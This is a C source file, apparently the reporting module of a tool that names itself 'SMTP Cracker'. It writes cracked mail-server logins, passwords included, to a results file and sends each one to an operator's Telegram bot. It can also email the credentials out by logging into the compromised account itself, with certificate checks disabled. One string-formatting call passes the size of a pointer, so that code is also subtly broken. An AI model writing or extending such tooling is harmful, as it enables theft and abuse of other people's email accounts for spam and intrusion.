#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <strsafe.h>

#include <core/notifications.h>
#include <smtplib/smtp.h> // Adjust path to where smtp.h is located

// --- Helper: Dummy write callback to prevent curl printing to stdout ---
static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    return size * nmemb;
}

// --- Helper: Send a message via Telegram Bot API ---
// Returns 1 if HTTP 200 OK, 0 otherwise
static int SendTelegramMessage(const char* token, const char* chat_id, const char* text) {
    CURL* curl;
    CURLcode res;
    long http_code = 0;
    int success = 0;

    char url[512];
    StringCchPrintfA(url, 512, "https://api.telegram.org/bot%s/sendMessage", token);

    curl = curl_easy_init();
    if (curl) {
        char* encoded_text = curl_easy_escape(curl, text, 0);
        if (encoded_text) {
            // Build POST data: chat_id=123&text=Hello...
            char* post_data = malloc(strlen(chat_id) + strlen(encoded_text) + 20);
            if (post_data) {
                StringCchPrintfA(post_data,sizeof(post_data),"chat_id=%s&text=%s",chat_id,encoded_text);

                curl_easy_setopt(curl, CURLOPT_URL, url);
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); // Silence output
                curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // 10 second timeout

                // Disable SSL verification (NOT recommended for production)
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
                curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);


                res = curl_easy_perform(curl);

                if (res == CURLE_OK) {
                    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
                    if (http_code == 200) {
                        success = 1;
                    }
                }

                free(post_data);
            }
            curl_free(encoded_text);
        }
        curl_easy_cleanup(curl);
    }
    return success;
}

// --- 1. Save Result to File ---
void SaveResultToFile(const char* filename, const SMTP_RESULT* result) {
    const char* target_file = (filename && filename[0] != '\0') ? filename : "results.txt";
    
    FILE* fp = fopen(target_file, "a"); // Append mode
    if (fp) {
        // Format: host|port|email|pass
        fprintf(fp, "%s|%d|%s|%s\n", result->host, result->port, result->email, result->password);
        fclose(fp);
    }
}

// --- 2. Update UI Labels ---
void UpdateThreadCountLabel(HWND hLabel, int value) {
    if (!hLabel) return;
    char buf[64];
    StringCchPrintfA(buf, 64, "Number of threads: %d", value);
    SetWindowTextA(hLabel, buf);
}

void UpdateRetryCountLabel(HWND hLabel, int value) {
    if (!hLabel) return;
    char buf[64];
    StringCchPrintfA(buf, 64, "Max retries: %d", value);
    SetWindowTextA(hLabel, buf);
}

// --- 3. Telegram Functions ---

int TestTelegram(const char* token, const char* chat_id) {
    if (!token || !*token || !chat_id || !*chat_id) return 0;
    return SendTelegramMessage(token, chat_id, "SMTP Cracker: Telegram integration test successful!");
}

int SendDetailedTelegram(const char* token, const char* chat_id, const SMTP_RESULT* result) {
    if (!token || !*token || !chat_id || !*chat_id) return 0;

    char msg[1024];
    StringCchPrintfA(msg, 1024, 
        "✅ Working SMTP Found!\n\n"
        "🌐 Host: %s\n"
        "🔌 Port: %d\n"
        "👤 Username: %s\n"
        "🔑 Password: %s\n\n"
        "📝 Status: Working",
        result->host, result->port, result->email, result->password
    );

    return SendTelegramMessage(token, chat_id, msg);
}

int SendSummaryTelegram(const char* token, const char* chat_id, int valid, int failed, int total) {
    if (!token || !*token || !chat_id || !*chat_id) return 0;

    char msg[512];
    StringCchPrintfA(msg, 512,
        "SMTP Cracker Results:\n"
        "Valid: %d\n"
        "Failed: %d\n"
        "Total: %d",
        valid, failed, total
    );

    return SendTelegramMessage(token, chat_id, msg);
}

// --- 4. Email Notification ---
void SendEmailNotification(const char* target_email, const SMTP_RESULT* result) {
    if (!target_email || !*target_email) return;

    struct smtp* smtp_ctx = NULL;
    enum smtp_status_code err;
    
    // Determine Security Type based on port (matching Python logic)
    // 465 = SSL (Implicit), Others = STARTTLS (Explicit)
    enum smtp_connection_security security = SMTP_SECURITY_STARTTLS;
    if (result->port == 465) {
        security = SMTP_SECURITY_TLS;
    }

    char port_str[8];
    StringCchPrintfA(port_str, sizeof(port_str), "%d", result->port);

    // 1. Connect
    err = smtp_open(result->host, port_str, security, SMTP_NO_CERT_VERIFY, NULL, &smtp_ctx);
    if (err != SMTP_STATUS_OK) {
        // Log error if needed
        return;
    }

    // 2. Auth
    err = smtp_auth(smtp_ctx, SMTP_AUTH_LOGIN, result->email, result->password);
    if (err != SMTP_STATUS_OK) {
        smtp_close(smtp_ctx);
        return;
    }

    // 3. Prepare Email Body
    char body[2048];
    // We must manually format headers + body for the smtp-client library
    StringCchPrintfA(body, 2048,
        "From: %s\r\n"
        "To: %s\r\n"
        "Subject: Working SMTP Details Found\r\n"
        "\r\n"
        "Working SMTP Details:\n"
        "Host: %s\n"
        "Port: %d\n"
        "Username: %s\n"
        "Password: %s\n\n"
        "Status: Working",
        result->email, target_email,
        result->host, result->port, result->email, result->password
    );

    // 4. Send
    // smtp_mail sends to recipients added via smtp_address_add
    // We need to add the FROM and TO addresses explicitly
    smtp_address_add(smtp_ctx, SMTP_ADDRESS_FROM, result->email, "SMTP Cracker");
    smtp_address_add(smtp_ctx, SMTP_ADDRESS_TO, target_email, "User");

    err = smtp_mail(smtp_ctx, body);

    // 5. Cleanup
    smtp_close(smtp_ctx);
}